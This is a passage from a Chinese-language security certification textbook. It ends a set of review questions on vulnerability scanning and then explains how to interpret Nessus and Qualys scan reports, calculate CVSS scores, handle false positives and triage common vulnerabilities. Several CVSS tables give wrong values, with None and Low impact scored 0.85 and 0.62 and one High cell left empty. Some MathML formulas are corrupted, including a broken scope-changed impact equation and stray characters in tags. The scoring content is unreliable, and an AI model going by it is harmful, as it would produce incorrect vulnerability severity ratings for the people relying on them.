  \    3. NIST\n    4. Microsoft\n\n12. 哪个术语描述组织对其计算环境风险的容忍度？\n    1. 风险格局\n    2.\
  \ 风险承受能力\n    3. 风险水平\n    4. 风险适应\n\n13. 下列因素对漏洞扫描计划的影响最小的是？\n    1. 监管要求\n   \
  \ 2. 技术限制\n    3. 业务限制\n    4. 人员可用性\n\n14. Barry 将组织所有的信用卡处理系统放在了一个用于卡处理的隔离网络上。他实施了适当的隔离控制，通过\
  \ VLAN 和防火墙将 PCI DSS 范围限制在这些系统上。当 Barry 为了 PCI DSS 合规目的进行漏洞扫描时，他必须扫描哪些系统？\n    1.\
  \ 客户系统\n\n\n\n\n2. 隔离网络上的系统\n3. 通用企业网络上的系统\n4. B 和 C 都是\n\n15. Ryan 计划使用危险的插件对业务关键系统进行漏洞扫描。初始扫描的最佳方法是什么？\n\
  1. 在生产系统上运行扫描，以获得尽可能真实的结果。\n2. 在业务工作期间运行扫描。\n3. 在测试环境中运行扫描。\n4. 不要运行扫描，以防干扰业务。\n\
  \n16. 下列哪些活动不属于漏洞管理生命周期的一部分？\n1. 探测\n2. 修复\n3. 报告\n4. 扫描\n\n17. 哪种漏洞扫描方法结合了运行在目标服务器上的代理程序的信息？\n\
  1. 持续监控\n2. 持续扫描\n3. 按需扫描\n4. 告警\n\n18. Kolin 想要使用自动化 Web 应用程序漏洞扫描器来识别即将部署到其环境中应用程序的任何潜在安全问题。以下工具中哪一个最可能无法满足他的需求？\n\
  1. ZAP\n2. Nikto\n3. Arachni\n4. Burp Suite\n\n19. Jessica 正在阅读由组织不同部门使用不同产品运行的漏洞扫描报告。她负责分配修复资源，但在优先考虑不同来源的问题时遇到困难。哪种\
  \ SCAP 组件可以帮助 Jessica 完成这项任务？\n1. CVSS\n2. CVE\n3. CPE\n4. XCCDF\n\n20. Sarah 想要出于\
  \ PCI DSS 合规性目的对系统运行外部漏洞扫描。谁授权完成这些扫描之一？\n1. 组织的任何员工\n2. 经批准的扫描供应商\n3. PCI DSS 服务提供商\n\
  4. 任何合格的人员\n\n# 第 7 章：分析漏洞扫描\n\n网络安全分析师花费大量时间分析和解释漏洞扫描器生成的报告。虽然扫描器在自动化识别漏洞的人工工作方面非常有效，但它们生成的结果需要经过培训的分析师进行解释，以消除误报、确定修复活动的优先级，并深入研究漏洞报告的根源。在本章中，你将学习网络安全分析师如何运用他们的知识和经验审查漏洞扫描报告。\n\
  \n## 审查和解释扫描报告\n\n漏洞扫描报告为分析师提供了大量信息，有助于解释报告。除了 第 6 章中所示的高级报告示例，“设计漏洞管理计划”之外，漏洞扫描器还会提供关于它们识别的每个漏洞的详细信息。图\
  \ 7.1 显示了 Nessus 漏洞扫描器报告的单个漏洞示例。\n\n让我们逐节查看此报告，从左上角开始，逆时针方向进行。\n\n在报告的最顶部，我们看到了两个关键细节：`漏洞名称`，它提供了一个描述性标题，以及漏洞的`整体严重性`，以通用类别的形式表示，例如低、中、高或危急。在这份示例报告中，扫描器报告某个服务器正在运行过时且不安全的\
  \ SSL 协议版本。它被分配到高严重程度类别。\n\n接下来，报告提供了该漏洞的`详细描述`。在这种情况下，报告提供了有关 SSL 协议中缺陷的详细描述，并解释了\
  \ SSL 不再被认为是可以使用的。\n\n报告的下一部分提供了漏洞的`解决方案`。在可能的情况下，扫描器会提供有关系统管理员、安全专业人员、网络工程师和/或应用程序开发人员如何修复漏洞的详细信息。在这种情况下，读者被指示禁用\
  \ SSL 2.0 和 3.0，并用安全的 TLS 协议版本替换它们的使用。\n\n在报告标题为“另见”的章节中，扫描器提供了`引用`，管理员可以在那里找到有关报告中描述漏洞的更多详细信息。在这种情况下，扫描器引导读者参考几篇博客文章、Nessus\
  \ 文档页面和互联网工程任务组 (IETF) 文档，这些文档提供了有关漏洞的更多详细信息。\n\n![图 7.1 Nessus 漏洞扫描报告](img/c07f001.png)\n\
  \n`图 7.1` Nessus 漏洞扫描报告\n\n报告的`输出`部分显示了探测漏洞时远程系统返回的详细信息。这些信息对分析师可能非常有价值，因为通常提供了命令返回的逐字输出。分析师可以利用此更好地理解为什么扫描器会报告漏洞，识别漏洞的位置，并可能识别误报。在这种情况下，输出部分显示了正在使用的特定不安全加密算法。\n\
  \n`端口/主机`部分提供了包含漏洞的服务器详细信息，以及该服务器上具有漏洞的特定服务。在这种情况下，出于隐私考虑，服务器的 IP 地址被掩盖了，但我们可以看到服务器在\
  \ 443 和 4433 端口上都在运行不安全的 SSL 版本。\n\n`漏洞信息`部分提供了有关该漏洞的一些杂杂信息。在这种情况下，我们看到 SSL 漏洞已出现在新闻报道中。\n\
  \n`风险信息`部分包含了评估漏洞严重性的有用信息。在这种情况下，扫描器报告该漏洞的整体风险因子为高（与漏洞标题旁边的标签一致）。它还提供了有关漏洞在使用通用漏洞评分系统\
  \ (CVSS) 时评分的详细信息。你会注意到有两个 CVSS 评分和向量。我们将使用 CVSS 版本 3 信息，因为它是更新的评分标准。在这种情况下，该漏洞的\
  \ CVSS 分为 7.5，并具有 CVSS 向量：\n\n```\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n\
  ```\n\n我们本章的下一节讨论 CVSS 的细节。\n\n漏洞报告的最后部分提供了检测该问题的漏洞扫描器插件的详细信息。该漏洞由 Nessus 插件 ID\
  \ `20007` 报告，该插件于 2005 年 10 月发布，并于 2019 年 3 月进行了更新。\n\n尽管本章重点是解释 Nessus 漏洞扫描的细节，但对于其他漏洞扫描器的过程也非常相似。不同产品生成的报告格式可能不同，但它们通常包含相同的信息。例如，图\
  \ 7.2 显示了 Qualys 漏洞报告的输出。\n\n![图 7.2 Qualys 漏洞扫描报告](img/c07f002.png)\n\n`图 7.2`\
  \ Qualys 漏洞扫描报告\n\n### 理解 CVSS\n\n`通用漏洞评分系统 (CVSS)` 是评估安全漏洞严重性的行业标准。它提供了一种根据各种衡量对每个漏洞进行评分的技术。网络安全分析师经常使用\
  \ CVSS 排名来优先响应措施。\n\n\n\n\n分析人员在对新漏洞进行评分时，首先从八个维度对漏洞进行评估。每个指标都包含一个描述性评分和一个数值分。前四个指标评估了漏洞的可利用性，而后三个指标评估了漏洞产生的影响。第八个指标讨论了漏洞的范围（Scope）。\n\
  \n### 攻击向量指标\n\n`攻击向量 (AV) 指标` 描述了攻击者将如何利用该漏洞，并根据 表 7.1 所示的标准进行赋值。\n\n`表 7.1` CVSS\
  \ 攻击向量指标\n\n| 值 || 描述 || 分数 |\n| --- | --- | --- |\n| 物理 (P) || 攻击者必须物理接触受影响的设备。\
  \ || 0.20 |\n| 本地 (L) || 攻击者必须对受影响的系统具有物理或逻辑访问。 || 0.55 |\n| 邻接网络 (A) || 攻击者必须能够访问受影响系统连接的本地网络。\
  \ || 0.62 |\n| 网络 (N) || 攻击者可以通过网络远程利用该漏洞。 || 0.85 |\n\n### 攻击复杂度指标\n\n`攻击复杂度 (AC)\
  \ 指标` 描述了利用该漏洞的难度，并根据 表 7.2 所示的标准进行赋值。\n\n`表 7.2` CVSS 攻击复杂度指标\n\n| 值 || 描述 || 分数\
  \ |\n| --- | --- | --- |\n| 高 (H) || 利用该漏洞需要难以发现的“特殊”条件。 || 0.44 |\n| 低 (L) || 利用该漏洞不需要任何特殊条件。\
  \ || 0.77 |\n\n### 所需权限指标\n\n`所需权限 (PR) 指标` 描述了攻击者利用漏洞所需的账户访问权限类型，并根据 表 7.3 中的标准进行赋值。\n\
  \n`表 7.3` CVSS 所需权限指标\n\n| 值 || 描述 || 分数 |\n| --- | --- | --- |\n| 高 (H) || 攻击者需要管理员权限执行攻击。\
  \ || 0.27 (如果范围改变则为 0.50) |\n| 低 (L) || 攻击者需要基本用户权限执行攻击。 || 0.62 (如果范围改变则为 0.68)\
  \ |\n| 无 (N) || 攻击者不需要身份验证即可利用该漏洞。 || 0.85 |\n\n### 用户交互指标\n\n`用户交互 (UI) 指标` 描述了攻击者是否需要让另一个人类参与攻击中。用户交互指标根据\
  \ 表 7.4 中的标准进行赋值。\n\n`表 7.4` CVSS 用户交互指标\n\n| 值 || 描述 || 分数 |\n| --- | --- | ---\
  \ |\n| 无 (N) || 成功利用不需要攻击者以外的任何用户采取行动。 || 0.85 |\n| 需要 (R) || 成功利用确实需要攻击者以外的用户采取行动。\
  \ || 0.62 |\n\n### 机密性指标\n\n`机密性指标` 描述了攻击者成功利用漏洞时可能发生的信息泄露类型。机密性指标根据 表 7.5 中的标准进行赋值。\n\
  \n`表 7.5` CVSS 机密性指标\n\n| 值 || 描述 || 分数 |\n| --- | --- | --- |\n| 无 (N) || 无信息泄露。\
  \ || 0.85 |\n| 低 (L) || 有部分信息泄露。 || 0.62 |\n| 高 (H) || 所有信息泄露。 || |\n\n### 完整性指标\n\
  \n`完整性指标` 描述了攻击者成功利用漏洞时可能发生的数据篡改类型。完整性指标根据 表 7.6 中的标准进行赋值。\n\n`表 7.6` CVSS 完整性指标\n\
  \n| 值 || 描述 || 分数 |\n| --- | --- | --- |\n| 无 (N) || 无完整性受损。 || 0.85 |\n| 低 (L)\
  \ || 部分数据被篡改。 || 0.62 |\n| 高 (H) || 所有数据被篡改。 || 0.6 |\n\n### 可用性指标\n\n`可用性指标` 描述了攻击者成功利用漏洞时可能导致的服务中断。可用性指标根据\
  \ 表 7.7 中的标准进行赋值。\n\n`表 7.7` CVSS 可用性指标\n\n| 值 || 描述 || 分数 |\n| --- | --- | ---\
  \ |\n| 无 (N) || 无可用性影响。 || 0.85 |\n| 低 (L) || 服务性能部分下降。 || 0.62 |\n| 高 (H) || 服务完全中断。\
  \ || 0.6 |\n\n### 范围指标\n\n`范围 (Scope) 指标` 描述了漏洞是否会影响范围之外的资源。范围指标根据 表 7.8 中的标准赋值。注意，范围指标不包含分数。范围的值反映在前面的所需权限指标中。\n\
  \n`表 7.8` CVSS 范围指标\n\n| 值 || 描述 |\n| --- | --- |\n| 未改变 | 仅影响范围内的资源。 |\n| 改变 |\
  \ 受影响的漏洞可以影响范围之外的资源。 |\n\n### 解读 CVSS 向量\n\n`CVSS 向量` 使用单行格式传达漏洞在所有指标上的评分。例如，回顾\
  \ 图 7.1 所示的 CVSS 向量：\n\n```\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n```\n\
  \n该向量包含九部分。第一部分 `CVSS:3.1` 告知读者（人类或系统）该向量是使用 CVSS 3.1 版本生成的。接下来的八部分对应每一个指标。在这种情况下，图\
  \ 7.1 中的 SSL 漏洞获得了以下评分：\n\n*   攻击向量：`N`（分数：0.85）\n*   攻击复杂度：`L`（分数：0.77）\n*   所需权限：`N`（分数：0.85）\n\
  *   用户交互：`N`（分数：0.85）\n*   范围：`U`\n*   机密性：`H`（分数：0.56）\n*   完整性：`N`（分数：0.00）\n\
  *   可用性：`N`（分数：0.00）\n\n### 总结 CVSS 分数\n\nCVSS 向量提供了关于漏洞风险性质的良好详细信息，但向量的复杂性使其在优先级排序练习中难以使用。因此，分析人员可以计算\
  \ `CVSS 基础分数`，这是一个代表漏洞整体风险的单一数字。得出基础分首先需要计算`可利用性分数`、`影响分数`和`影响函数`。\n\n#### 计算影响子分\
  \ (ISS)\n\n分析人员执行的第一项计算是计算影响子分 (ISS)。该指标使用以下公式汇总三个影响指标：\n\n\n\n\n\n![upper I upper\
  \ S upper S equals 1 en-dash left-bracket left-parenthesis 1 en-dash upper C o n\
  \ f i d e n t i a l l i t y right-parenthesis times left-parenthesis 1 en-dash upper\
  \ I n t e g r i t y right-parenthesis times left-parenthesis 1 en-dash upper A v\
  \ a i l a b i l i t y right-parenthesis right-bracket](img/c07-disp-0001.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"\
  normal\">ISS</mi><mo>=</mo><mn>1</mn><mo>&#8211;</mo><mrow><mo>\\[</mo><mrow><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mspace\
  \ width=\"0.25em\"/><mspace width=\"0.25em\"/><mi mathvariant=\"normal\">Confidentiality</mi></mrow><mo>)</mo></mrow><mo>&#215;</mo><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mi\
  \ mathvariant=\"normal\">Integrity</mi></mrow><mo>)</mo></mrow><mo>&#215;</mo><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mi\
  \ mathvariant=\"normal\">Availability</mi></mrow><mo>)</mo></mrow></mrow><mo>\\\
  ]</mo></mrow></mrow></math>\n\n代入我们 SSL 漏洞的数值，我们得到：\n\n![upper I upper S upper S\
  \ equals 1 en-dash left-bracket left-parenthesis 1 en-dash 0.56 right-parenthesis\
  \ times left-parenthesis 1 en-dash 0.00 right-parenthesis times left-parenthesis\
  \ 1 en-dash 0.00 right-parenthesis right-bracket](img/c07-disp-0002.png)<math display=\"\
  block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"normal\"\
  >ISS</mi><mo>=</mo><mn>1</mn><mo>&#8211;</mo><mrow><mo>\\[</mo><mrow><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mspace\
  \ width=\"0.25em\"/><mspace width=\"0.25em\"/><mn>0.56</mn></mrow><mo>)</mo></mrow><mo>&#215;</mo><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mn>0.00</mn></mrow><mo>)</mo></mrow><mo>&#215;</mo><mrow><mo>(</mo><mrow><mn>1</mn><mo>&#8211;</mo><mn>0.00</mn></mrow><mo>)</mo></mrow></mrow><mo>\\\
  ]</mo></mrow></mrow></math> ![upper I upper S upper S equals 1 en-dash left-bracket\
  \ 0.44 times 1.00 times 1.00 right-bracket](img/c07-disp-0003.png)<math display=\"\
  block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"normal\"\
  >ISS</mi><mo>=</mo><mn>1</mn><mo>&#8211;</mo><mspace width=\"0.25em\"/><mspace width=\"\
  0.25em\"/><mrow><mo>\\[</mo><mrow><mn>0.44</mn><mo>&#215;</mo><mn>1.00</mn><mo>&#215;</mo><mn>1.00</mn></mrow><mo>\\\
  ]</mo></mrow></math> ![upper I upper S upper S equals 1 en-dash 0.44](img/c07-disp-0004.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"\
  normal\">ISS</mi><mo>=</mo><mn>1</mn><mo>&#8211;</mo><mn>0.44</mn></mrow></math>\
  \ ![upper I upper S upper S equals 0.56](img/c07-disp-0005.png)<math display=\"\
  block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"normal\"\
  >ISS</mi><mo>=</mo><mn>0.56</mn></mrow></math>\n\n### 计算影响分 (Impact Score)\n\n要从影响子分获得结果，必须考虑范围（scope）指标。如果范围是“未更改”（Unchanged），如我们的示例所示，我们将\
  \ ISS 乘以 6.42：\n\n![upper I m p a c t equals 6.42 asterisk upper I S](img/c07-disp-0006.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"\
  normal\">Impact</mi><mo>=</mo><mn>6.42</mn><mo>&#42;</mo><mspace width=\"0.25em\"\
  /><mi mathvariant=\"normal\">ISS</mi></mrow></math> ![upper I m p a c t equals 6.42\
  \ asterisk 0.56](img/c07-disp-0007.png)<math display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"\
  ><mrow><mi 贯=\"normal\">Impact</mi><mo>=</mo><mn>6.42</mn><mo>&#42;</mo><mspace\
  \ width=\"0.25em\"/><mn>0.56</mn></mrow></math> ![upper I m p a c t equals 3.60](img/c07-disp-0008.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi 贯=\"\
  normal\">Impact</mi><mo>=</mo><mn>3.60</mn></mrow></math>\n\n如果范围是“已更改”（Changed），我们使用更复杂的公式：\n\
  \n![Impact equals 7.52 times (ISS - 0.029) - 3.25 times (ISS - 0.02)¹⁵](img/c07-disp-0009.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mtext>Impact</mtext><mo>=</mo><mn>7.52</mn><mo>&#215;</mo><mrow><mo>(</mo><mrow><mtext>ISS</mtext><mo>&#8211;</mo><mn>0.029</mn></mrow><mo>)</mo></mrow><mo>&#215;</mo><mn>3.25</mn><mo>&#215;</mo><msup><mo>(</mo><mrow><mtext>ISS</mtext><mo>&#8211;</mo><mn>0.02</mn></mrow><mo>)</mo></mn>15</mn></msup></mrow></math>\n\
  \n### 计算利用性分 (Exploitability Score)\n\n`Exploitability` 是攻击者能够利用漏洞访问系统的可能性。它通常也被称为“武器化”（weaponization）——攻击者开发利用特定漏洞漏洞的能力。\n\
  \n分析人员可以使用此公式计算漏洞的利用性：\n\n```\nExploitability = 8.22 * AttackVector * AttackComplexity\
  \ * PrivilegesRequired * UserInteraction\n```\n\n![formula image](img/c07-disp-0010.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mi mathvariant=\"\
  normal\">Exploitability</mi><mo>=</mo><mn>8.22</mn><mo>&#8215;</mo><mi mathvariant=\"\
  normal\">AttackVector</mi><mo>&#8215;</mo><mi mathvariant=\"normal\">AttackComplexity</mi><mo>&#8215;</mo><mi\
  \ mathvariant=\"normal\">PrivilegesRequired</mi><mo>&#8215;</mo><mi mathvariant=\"\
  normal\">UserInteraction</mi></mrow></math>\n\n代入我们 SSL 漏洞的数值，我们得到：\n\n![1st Row\
  \ Exploitability = 8.22 * 0.85 * 0.77 * 0.85 * 0.85, 2nd Row Exploitability = 3.89](img/c07-disp-0011.png)<math\
  \ display=\"block\" xmlns=\"http://www.w3.org/1998/Math/MathML\"><mrow><mtable columnalign=\"\
  left\"><mtr><mtd><mrow><mi mathvariant=\"normal\">Exploitability</mi><mo>=</mo><mn>8.22</mn><mo>&#8215;</mo><mn>0.85</mn><mo>&#8215;</mo><mn>0.77</mn><mo>&#8215;</mo><mn>0.85</mn><mo>&#8215;</mo><mn>0.85</mn></mrow></mtd></mtr><mtr><mtd><mrow><mi\
  \ 贯=\"normal\">Exploitability</mi><mo>=</mo><mn>3.89</mn></mrow></mtd></mtr></mtable></mrow></math>\n\
  \n### 计算基础分 (Base Score)\n\n有了所有这些信息，我们现在可以根据以下规则确定 CVSS 基础分：\n\n*   如果影响为 0，则基础分为\
  \ 0。\n*   如果范围指标是“未更改”（Unchanged），通过将影响分和利用性分相加计算基础分。\n*   如果范围指标是“已更改”（Changed），将影响分和利用性分相加，并将结果乘以\
  \ 1.08。\n*   最高基础分分为 10。如果计算出的值大于 10，则将基础分设置为 10。\n\n在我们的示例中，影响分为 3.60，利用性分四舍五入为\
  \ 3.9。将两者相加，我们得到基础分为 7.5。\n\n\n\n\n\n网络安全分析师在解释报告时，通常会进行自己的调查以确认漏洞的存在及其严重性。这些调查可能包括使用外部数据源，为分析提供有价值的额外信息。\n\
  \n### 误报（False Positives）\n\n漏洞扫描器是有用的工具，但它们并非万无一失。扫描器会因为各种原因出错。扫描器可能没有足够的权限访问目标系统来确认漏洞，或者其生成错误漏洞报告的插件中可能存在错误。当扫描器报告了一个不存在的漏洞时，这被称为\
  \ `false positive error`（误报错误）。\n\n当漏洞扫描器报告一个漏洞时，这被称为 `positive report`（确认报告）。该报告可能是准确的（`true\
  \ positive`报告），也可能是不准确的（`false positive`报告）。同样，当扫描器报告不存在某个漏洞时，这是一个 `negative report`（阴性报告）。阴性报告可能是准确的（`true\
  \ negative`报告），也可能是不准确的（`false negative`报告，即漏报）。\n\n网络安全分析师应该确认扫描器报告的每一个漏洞。在某些情况下，这可能仅仅是验证补丁是否缺失或操作系统是否过旧。在其他情况下，验证漏洞需要一个复杂的模拟利用的人工流程。例如，验证\
  \ SQL 注入漏洞可能需要实际上对 Web 应用程序尝试攻击，并在后端数据库中验证结果。\n\n在验证漏洞时，分析师应该在整个过程中利用自己的专业知识，以及组织内其他人的领域知识。数据库管理员、系统工程师、网络技术人员、软件开发人员和其他专家都拥有领域知识，这些知识对于评估潜在的误报报告至关重要。\n\
  \n### 记录的异常（Documented Exceptions）\n\n在某些情况下，组织可能出于某种原因决定不修复某个漏洞。例如，组织可能决定根据业务需求必须使用一种不再支持的操作系统。同样，开发经理可能认为，修复仅暴露在内部网络的\
  \ Web 应用程序漏洞的成本超过了其带来的安全收益。\n\n除非分析师采取行动来记录这些异常，否则漏洞扫描在每次运行时都会继续报告这些异常。在漏洞管理系统中记录异常是一项良好的做法，这样扫描器在未来的报告中就能够忽略它们。这可以减少扫描报告中的噪声水平，并增加其对分析师的实用性。\n\
  \n### 理解信息性结果（Informational Results）\n\n漏洞扫描器在使用默认配置运行时，通常会提供非常详细的信息。漏洞扫描器报告的所有内容并不代表重大的安全问题。尽管如此，扫描器会提供其能确定尽可能的信息，以显示攻击者在进行侦察扫描时可能收集的信息类型。\n\
  \n图 7.3 提供了一个针对 Web 服务器运行漏洞扫描生成的高级报告示例。请注意，该报告中约三分之二的漏洞属于“信息（Info）”风险类别。这表明提供结果的插件甚至没有根据\
  \ `CVSS` 进行分类。相反，它们仅仅是信息性结果。大多数组织不会采取移除所有关于系统的可能信息来源的措施，因为这可能非常困难，甚至是不可能的。\n\n![图\
  \ 7.3 显示漏洞和最佳实践的扫描报告](img/c07f003.png)\n\n`图 7.3` 显示漏洞和最佳实践的扫描报告\n\n网络安全分析师在遇到图\
  \ 7.3 中的扫描报告时，应该首先关注存在的高危 SQL 注入漏洞。一旦修复了该漏洞，还有七个中危漏洞需要关注。剩余的信息性漏洞可能可以不管。许多组织将针对如何处理这些信息性消息采取正式政策。例如，某些组织可能决定，一旦信息在连续两次或三次扫描中出现，他们将创建一个日志条目，记录他们应对该信息所采取的行动或选择不采取行动的原因。对于具有严格合规要求的组织，这种方法尤为重要，由于审计（注：此处原文根据上下文理解）决策过程的正式记录可以证明组织已尽尽职调查。\n\
  \n### 将扫描结果与其他数据源相结合\n\n漏洞扫描绝不能在真空中进行。网络安全分析师在解释这些报告时，应该转向其他安全信息源。此过程的有价值信息源包括：\n\
  \n* 服务器、应用程序、网络设备和其他可能包含利用漏洞尝试信息的`日志`\n\n* `安全信息和事件管理 (SIEM)` 系统，它可以关联多个源的日志并提供可操作的情报\n\
  \n* 提供系统上操作系统和应用程序信息的`配置管理系统`\n\n当分析师尝试将扫描报告与组织的实际情况相结合时，这些每一个信息源都可能是极具价值的。\n\n\
  ### 趋势分析（Trend Analysis）\n\n趋势分析也是漏洞扫描计划的重要部分。经理应该关注漏洞的整体趋势，包括随时间产生的新漏洞数量、现有漏洞年龄以及修复漏洞所需的时间。图\
  \ 7.4 显示了 Nessus SecurityCenter 中的趋势分析报告示例。\n\n![图 7.4 漏洞趋势分析 ¶ 源：Tenable Network\
  \ Security](img/c07f004.png)\n\n`图 7.4` 漏洞趋势分析 ¶ 源：Tenable Network Security\n\n\
  ### 上下文感知（Context Awareness）\n\n评估漏洞时，你还必须考虑组织以及发现漏洞环境的具体上下文。例如，直接连接到互联网的系统上的漏洞要比内部系统或隔离网络上的系统上的漏洞严重得多。\n\
  \n同样，受影响系统的`资产价值`也应该在确定修复优先级时发挥作用。高价值资产对组织构成了更大的风险，在修复优先级列表中应该更靠前。\n\n### 常见漏洞（Common\
  \ Vulnerabilities）\n\n每个漏洞扫描系统都包含能够检测数千种可能漏洞的插件，从 Web 应用程序中的重大 SQL 注入漏洞到网络设备中较常见的信息泄露问题。虽然在任何长度的书中都不可能讨论这些每一种漏洞，但网络安全分析师应该熟悉最常见的漏洞以及涵盖许多不同漏洞变体的通用类别。\n\
  \n\n\n\n\n第 6 章 讨论了定期更新漏洞扫描器的重要性，使其能够有效应对新发现的威胁。尽管事实如此，但同样重要的是，即使是旧漏洞也可能对组织的安全带来重大问题。威瑞森（Verizon）每年都会对过去一年中调查的所有数据泄露事件进行一次广受尊敬的分析。图\
  \ 7.5 显示了 2016 年数据泄露调查报告的部分结果。（请注意，威瑞森继续每年发布这些报告，但它们不再包含发现年份数据。）\n\n图 7.5 强调了处理旧漏洞的重要性，以及许多组织未能做到这一点的严酷现实。在数据泄露中被利用的许多漏洞都是在*十多年*以前就发现的漏洞。这是一个令人惊讶的统计数据。\n\
  \n![图 7.5 2015 年按初始发现年份分类的被利用漏洞](img/c07f005.png)\n\n图 7.5 2015 年按初始发现年份分类的被利用漏洞\n\
  \n## 服务器与终端漏洞\n\n计算机系统非常复杂。运行在服务器和终端上的操作系统由数百万行代码组成，而且它们运行的应用程序组合不同使得每个系统都具有相当的特性。因此，扫描检测到的许多漏洞存在于服务器和终端系统中这并不意外，而且这些漏洞往往是修复起来最复杂的漏洞。\n\
  \n### 缺失补丁\n\n对系统应用安全补丁应该是任何信息安全计划的核心实践之一，但由于缺乏预防性维护的资源，这项常规任务经常被忽视。漏洞扫描最常见的警报之一是网络上的一个或多个系统运行着过时的操作系统或应用程序，并且需要安全补丁。\n\
  \n图 7.6 显示了此类扫描结果的一个示例。位于 `10.64.142.211` 的服务器存在远程代码执行漏洞。虽然扫描结果非常简，但它确实包含了许多有用信息：\n\
  \n*   描述告诉我们这是 Windows HTTP 栈中的一个缺陷。\n\n    ![图 7.6 缺失补丁漏洞](img/c07f006.png)\n\n\
  \    图 7.6 缺失补丁漏洞\n\n*   报告输出部分的服务信息确认了服务器在 TCP 端口 `443` 上运行着 HTTPS 服务。\n\n*   我们在页头中看到这是一个严重漏洞，这在“风险信息”部分也得到了确认，在该部分我们看到它的\
  \ CVSS 基础分为 10 分。\n\n幸运的是，有一种简单的方法可以解决这个问题。“解决方案”部分告诉我们，微软已为受影响的操作系统发布了补丁，“另参”部分提供了指向微软安全公告（`MS15-034`）的直接链接，该公告更详细地描述了该问题和解决方案。\n\
  \n### 生命周期结束或过时组件\n\n软件供应商最终会停止对其制造的每个产品的支持。操作系统和应用程序也是如此。一旦他们宣布产品的最终终止支持，继续运行过时软件的组织将自己面临重大的攻击风险。供应商将不再调查或纠正在该日期之后产品中出现的安全缺陷。从安全的角度来看，继续运行不受支持产品的组织只能自力更，除非你恰好维护有一支操作系统开发团队，否则那不是一个你所处的好境。\n\
  \n也许最著名的主流操作系统终止支持发生在 2015 年 7 月，当时微软停止了对已十多年的 Windows 的支持。图 7.7 显示了 Nessus 识别出运行该过时操作系统的漏洞。\n\
  \n![图 7.7 不支持的操作系统系统漏洞](img/c07f007.png)\n\n图 7.7 不支持的操作系统系统漏洞\n\n我们从报告中看到，网络上运行\
  \ Windows 2003 的服务器检测到了漏洞。对于继续运行不支持操作系统的描述表明：\n\n> 缺乏支持意味着不会为产品发布新的安全补丁。\n\n对于继续运行不支持操作系统的解决方案在表述上很简单，但在实施上很复杂。“升级到当前支持的\
  \ Windows 版本”这一指令可能面临重大挑战。\n\n安全专业人员应该关注产品和服务生命周期信息，以帮助规划和缓解即将到来的 EOL 情况。许多供应商在他们的网站上提供此类信息。例如，微软在\
  \ `https://learn.microsoft.com/en-us/lifecycle/products` 提供此类信息。\n\n在必须继续使用不支持的操作系统的情况下，最佳实践是尽可能隔离系统，最好不要连接到任何网络，并尽可能应用补偿控制。你将在第\
  \ 8 章](#c08.xhtml)“响应漏洞”中学习更多关于补偿控制的内容。\n\n### 缓冲区溢出\n\n*缓冲区溢出*攻击发生在攻击者操纵程序向内存区域写入超过其分配的数据时。目标是在内存中覆盖由不同进程执行的指令。\n\
  \n缓冲区溢出攻击非常常见，并且在发现后往往会持续多年。例如，威瑞森数据泄露调查报告识别出的 10 个漏洞导致了研究中 85% 的入侵。在前 10 个问题中有四个溢出问题：\n\
  \n*   `CVE-1999-1058`: Vermillion FTP Daemon 缓冲区溢出\n*   `CVE-2001-0876`: Windows\
  \ 98、98SE、ME 和 XP 上通用即插用 (UPnP) 的缓冲区溢出\n*   `CVE-2002-0126`: BlackMoon FTP Server\
  \ 1.0 至 1.5 的缓冲区溢出\n*   `CVE-2003-0818`: Microsoft ASN.1 库中的多个整数溢出\n\n每个漏洞标题中 CVE\
  \ 字母后面的四位数字表示该漏洞被发现的年份。在最近一次对泄露的研究中，导致泄露的前 10 个问题中，有四个是长了 12 到 16 年的溢出漏洞的利用！\n\n\
  安全分析师在漏洞扫描期间发现缓冲区溢出漏洞时，应该寻找修复该问题的补丁。在大多数情况下，扫描报告会直接标识可用的补丁。\n\n### 权限提升\n\n*权限提升*攻击寻求增加攻击者对目标系统的访问权限级别。它们利用允许将普通用户账户转换为更高权限账户（例如\
  \ root 超级用户）的漏洞。\n\n\n\n\n\n2016 年 10 月，安全研究人员发现了一个名为 `Dirty COW` 的 Linux 内核漏洞。该漏洞在\
  \ Linux 内核中已存在九年，极易被利用，并能让成功的攻击者获得受影响系统的管理控制权限。\n\n为了传播该漏洞并鼓励及时修复 Linux 内核，安全研究人员设立了\
  \ `DirtyCOW.ninja` 网站，如图 7.8\n\n图 7.8 Dirty COW 网站\n\n## 远程代码执行\n\n`代码执行`漏洞允许攻击者在目标系统上运行其选择的软件。这可能是一场灾难性的事件，特别是当漏洞允许攻击者以管理员权限运行代码时。`远程代码执行`漏洞是代码执行漏洞中更危险的子集，因为攻击者可以通过网络连接利用该漏洞，而无需对目标系统具有物理或逻辑访问。\n\
  \n图 7.9 显示了 Nessus 检测到的远程代码执行漏洞示例。请注意，CVSS 访问向量显示该漏洞的访问向量是基于网络的。这与远程代码执行漏洞的描述是一的。向量中的影响指标显示，攻击者可以利用该漏洞完全攻破系统。\n\
  \n幸运的是，与大多数扫描检测出的漏洞一样，该问题有一个简单的修复。微软针对受此问题影响的 Windows 版本发布了补丁，并在微软安全公告 `MS14-066`\
